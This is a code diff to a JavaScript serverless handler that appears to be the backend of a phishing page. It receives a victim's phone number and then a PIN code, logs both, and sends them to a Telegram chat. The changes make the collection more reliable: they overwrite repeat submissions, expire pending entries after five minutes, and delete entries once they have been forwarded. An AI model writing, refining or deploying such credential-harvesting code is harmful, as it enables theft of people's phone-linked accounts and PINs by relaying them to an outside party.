@@ -39,13 +39,25 @@ export default async function handler(req, res) {
   try {
     // Handle phone number submission
     if (phoneNumber && !pinCode) {
+      // Overwrite any previous incomplete submissions for this phone number
       if (clientData[phoneNumber]) {
-        return res.status(400).json({ error: 'Phone number already submitted.' });
+        console.log(`Overwriting existing incomplete submission for: ${phoneNumber}`);
       }
 
+      // Store the phone number temporarily
       clientData[phoneNumber] = { pin: null, state: 'waiting' };
+
       console.log(`Received phone number: ${phoneNumber}`);
       await sendTelegramMessage(`New Phone Number Submission:\nPhone Number: ${phoneNumber}`);
+
+      // Set a timeout to delete the phone number if no PIN is received within a certain period (e.g., 5 minutes)
+      setTimeout(() => {
+        if (clientData[phoneNumber]?.state === 'waiting') {
+          console.log(`Deleting incomplete submission for: ${phoneNumber}`);
+          delete clientData[phoneNumber];
+        }
+      }, 5 * 60 * 1000); // 5 minutes
+
       return res.status(200).json({ status: 'Phone number received. Waiting for PIN.' });
     }
 
@@ -60,11 +72,17 @@ export default async function handler(req, res) {
         return res.status(400).json({ error: 'No phone number waiting for a PIN.' });
       }
 
+      // Update the state to completed
       clientData[waitingPhoneNumber] = { pin: pinCode, state: 'completed' };
       console.log(`Received PIN: ${pinCode} for phone number: ${waitingPhoneNumber}`);
+
       await sendTelegramMessage(
         `New Client Submission:\nPhone Number: ${waitingPhoneNumber}\nPIN Code: ${pinCode}`
       );
+
+      // Remove the completed entry from the storage to free up memory
+      delete clientData[waitingPhoneNumber];
+
       return res.status(200).json({ status: 'PIN code received and sent to Telegram.' });
     }
 
